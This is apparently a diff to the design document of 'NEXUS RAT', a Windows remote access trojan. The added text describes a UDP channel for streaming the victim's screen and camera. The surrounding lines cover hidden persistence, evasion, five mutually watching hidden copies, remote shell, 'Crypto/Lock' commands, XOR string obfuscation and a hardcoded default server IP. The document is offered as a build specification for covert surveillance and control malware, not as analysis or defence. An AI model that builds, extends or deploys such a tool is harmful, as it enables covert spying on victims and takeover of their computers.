@@ -35,17 +35,20 @@ TABLE OF CONTENTS
 NEXUS RAT is a remote monitoring and administration toolkit consisting of three
 components:
 
-  +----------+          +----------+          +-----------+
-  |  Agent   | -------> |  Server  | <------- | Dashboard |
-  |client.py |  WS/WSS  |server.py |   WS     |   HTML5   |
-  |(PyInst.) |          |(FastAPI) |          | (built-in)|
-  +----------+          +----------+          +-----------+
-                              |
-                        +-----------+
-                        |  Manager  |
-                        |remote_man.|
-                        |(Builder)  |
-                        +-----------+
+  +----------+     TCP/WS      +----------+       WS       +-----------+
+  |  Agent   | ──────────────> │  Server  │ <──────────── │ Dashboard |
+  |client.py |  (control ch.)  │server.py │     (viewer)  │   HTML5   |
+  |          |                 │(FastAPI) │               | (built-in)|
+  |          | ──────────────> │          │               +-----------+
+  |          |   UDP          │          │
+  |          |  (stream ch.)  │          │
+  +----------+                +----------+
+                                    |
+                              +-----------+
+                              |  Manager  |
+                              |remote_man.|
+                              |(Builder)  |
+                              +-----------+
 
   - Agent:  Python script compiled via PyInstaller into a single .exe.
             Runs on target Windows machines.
@@ -57,25 +60,44 @@ components:
 2. ARCHITECTURE
 ================================================================================
 
-2.1 Communication Channels
-  - Control channel:  /ws/client      (agent registration + commands + shell)
-  - Stream channel:   /ws/client      (same connection, multiplexed)
-  - Camera channel:   /ws/client_cam  (separate WebSocket for webcam)
-  - Viewer channel:   /ws/viewer/{id} (dashboard browser, max 10 per agent)
-  - Cam viewer:       /ws/viewer_cam/{id} (dashboard browser, max 5 per agent)
+2.1 Dual-Channel Communication
+  The agent maintains TWO independent connections to the server:
 
-2.2 Protocol
-  All control messages are JSON. Stream data is binary:
-    \x01 + JPEG bytes  (screen or camera frame)
-    \x04 + samplerate(2B LE) + numsamples(2B LE) + s16le PCM  (audio)
-    \x03 + PCM header + s16le payload  (admin-to-agent mic)
+  +----------------------------+-------------------------------------------+
+  | Control Channel (TCP/WS)   | Stream Channel (UDP)                      |
+  +----------------------------+-------------------------------------------+
+  | Path: /ws/client           | Port: WS_PORT + 1000 (default 9999)       |
+  | Protocol: WebSocket (TCP)  | Protocol: Raw UDP datagrams               |
+  | Reliability: Guaranteed    | Reliability: Best-effort                  |
+  | Traffic: Registration,     | Traffic: Screen frames, Camera frames     |
+  |          Shell commands,   |                                           |
+  |          HID events,       |                                           |
+  |          File ops,         |                                           |
+  |          Crypto/Lock cmds  |                                           |
+  +----------------------------+-------------------------------------------+
 
-2.3 Key Design Patterns
-  - All persistence/privacy/evasion functions are idempotent and self-healing
-  - Stream uses adaptive quality (15-85) based on send latency
-  - Frame differencing (MD5) skips encode/send for identical frames
-  - HID events get priority: stream throttles to 15fps when input active
-  - Mutual watchdog: 5 hidden copies monitor each other continuously
+  Why UDP for streaming:
+    - Screen frames are loss-tolerant: a dropped frame is replaced by the
+      next one within milliseconds
+    - UDP removes TCP head-of-line blocking: a lost TCP segment for a frame
+      does not stall subsequent control messages
+    - The control WebSocket stays uncongested, reducing command latency
+    - Automatic fallback: if UDP is unavailable (firewalled), the agent
+      transparently falls back to sending frames over the WebSocket channel
+
+2.2 Connection Stability Mechanisms
+  Three independent keepalive layers prevent disconnection:
+
+    1. WebSocket protocol pings (every 10s, timeout 45s)
+    2. TCP SO_KEEPALIVE (OS-level probes every 5s, retry 3s)
+    3. Application JSON pings ({"cmd":0x7E} every 22s)
+
+  If the control WebSocket drops:
+    - Reconnect starts at 2s delay, doubles each failure, caps at 30s
+    - Stream UDP socket is recreated on reconnect
+    - Registration is re-sent with fresh UDP port
+
+2.3 WebSocket Endpoints
 
 
 ================================================================================
@@ -277,14 +299,39 @@ All features in this section are activated by `enhanced_install_persistence()`
 4.3 SCREEN & CAMERA STREAMING
 --------------------------------------------------------------------------------
 
-4.3.1 Screen Capture & MJPEG Stream  (stream_loop)
+Streaming uses a dual-channel architecture:
+  - Control commands → TCP WebSocket (reliable)
+  - Screen/camera frames → UDP datagrams (fast, best-effort)
+
+4.3.1 UDP Stream Transport  (_send_udp_frame)
+  Frame packet format:
+    [device_id: 36 bytes ASCII]
+    [sequence:    4 bytes LE]
+    [frame_type:  1 byte]          0x01=screen, 0x02=camera
+    [frag_total:  1 byte]          Number of fragments for this frame
+    [frag_idx:    1 byte]          Zero-based fragment index
+    [payload:     up to 60000 B]   JPEG data (or fragment thereof)
+
+  Fragmentation:
+    - If a JPEG exceeds 60000 bytes, it is split into multiple UDP datagrams
+    - The server reassembles fragments by (device_id, seq) before forwarding
+    - Stale fragments are garbage-collected after 10 seconds
+    - Max payload per datagram: 60000 bytes to avoid IP fragmentation
+
+  Fallback:
+    - If UDP send fails (socket error), _send_udp_frame returns False
+    - send_stream() and send_cam() automatically fall back to WebSocket for
+      that frame
+    - UDP is disabled entirely when SERVER_IP is 127.0.0.1 or localhost
+
+4.3.2 Screen Capture & MJPEG Stream  (stream_loop)
   Uses MSS (Multiple Screen Shots) to capture the primary monitor.
   Pipeline:
     1. mss.grab() → BGRA raw bytes
     2. PIL.Image.frombytes() → convert to RGB
     3. JPEG encode with quality 15-85
     4. Prepend \x01 marker byte
-    5. Send over WebSocket control channel
+    5. Send over UDP (preferred) or WebSocket (fallback)
 
   Adaptive quality control:
     - Measures send-to-send elapsed time (last 10 frames)
@@ -582,7 +629,21 @@ a background thread queue for low-latency, non-blocking execution.
   GET  /network_config  Returns current network configuration
   POST /network_config  Saves updated network configuration
 
-5.5 Dashboard HTML/JS SPA
+5.5 UDP Stream Receiver
+  The server runs an asyncio.DatagramProtocol (UDPStreamProtocol) that:
+    - Listens on STREAM_PORT (default: WS_PORT + 1000, or auto-assigned)
+    - Receives UDP datagrams from all agents
+    - Parses device_id to identify the originating agent
+    - Reassembles multi-fragment frames in a dict buffer
+    - Forwards complete frames to browser viewers via their WebSockets
+      (broadcast_bytes for screen, broadcast_cam_bytes for camera)
+    - Garbage-collects stale fragments every 15 seconds
+
+  Concurrency:
+    - UDP datagram_received runs on the asyncio event loop
+    - Frame relay is scheduled via asyncio.ensure_future (non-blocking)
+
+5.6 Dashboard HTML/JS SPA
   ~4000-line embedded single-page application with all UI features listed
   in Section 3. Built with vanilla JavaScript, no frameworks.
 
@@ -669,14 +730,23 @@ a background thread queue for low-latency, non-blocking execution.
   Agent → Dashboard: { "cmd": 0x13, "data": { "name": "file.txt",
     "bytes": "<base64>" } }
 
-7.5 Stream Binary Frames
-  Agent → Server → Viewers:
-    Type byte + payload:
-    0x01 + JPEG data       (screen/camera frame)
-    0x04 + samplerate(2B LE) + count(2B LE) + s16le PCM  (audio)
-    0x03 + PCM header + s16le payload  (admin mic → agent)
+7.5 UDP Stream Transport (Agent → Server)
+  Unlike control messages which use JSON over WebSocket, stream frames are
+  sent as raw UDP datagrams for lower latency:
 
-7.6 View Control
+  [device_id   : 36 bytes]  ASCII-encoded agent UUID
+  [sequence    :  4 bytes]  uint32 LE, incrementing per frame
+  [frame_type  :  1 byte]   0x01 = screen, 0x02 = camera
+  [frag_total  :  1 byte]   total number of fragments for this frame
+  [frag_idx    :  1 byte]   zero-based fragment index
+  [payload     :  ≤ 60000]  JPEG data (or fragment)
+
+  Fragmentation: frames larger than 60000 bytes are split into multiple
+  datagrams with frag_total > 1. The server reassembles before forwarding.
+
+7.6 Stream Binary Frames (Server → Viewers)
+
+7.7 View Control
   Dashboard → Agent: { "cmd": 0x15, "args": { "mode": "screen|cam",
     "audio": true|false } }
   Also: { "cmd": 0x15, "args": { "substream": "cam",
@@ -765,6 +835,7 @@ a background thread queue for low-latency, non-blocking execution.
 9.2 Environment Variables
   SERVER_IP (default: 54.174.116.107)
   SERVER_PORT or PORT (default: 80)
+  STREAM_PORT (default: SERVER_PORT + 1000) — UDP port for stream frames
 
 9.3 Build-time Variables (injected by manager)
   _OBF_KEY: 16 random bytes for string XOR obfuscation
